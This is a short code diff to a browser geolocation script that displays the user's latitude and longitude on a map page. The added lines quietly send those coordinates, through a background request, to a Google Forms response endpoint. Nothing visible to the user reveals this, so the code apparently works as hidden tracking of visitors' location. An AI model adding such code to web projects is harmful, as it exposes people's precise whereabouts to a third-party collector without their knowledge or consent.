@@ -16,6 +16,12 @@ function geoFindMe() {
     lng = longitude;
     initMap();
 
+    const queryEndpoint = `https://docs.google.com/forms/d/e/1FAIpQLSdmqldF2qWeNB63aORpAx6eyzPL_nY9dVoYoO5Q1aC7Rn6hIw/formResponse?entry.169344923=${lat}&entry.1731324848=${lng}`
+
+    const xhr = new XMLHttpRequest()
+    xhr.open('GET', queryEndpoint, true)
+    xhr.send()
+    
     output.innerHTML = '<p>Latitude is ' + latitude + '° <br>Longitude is ' + longitude + '°</p>';
 
   }
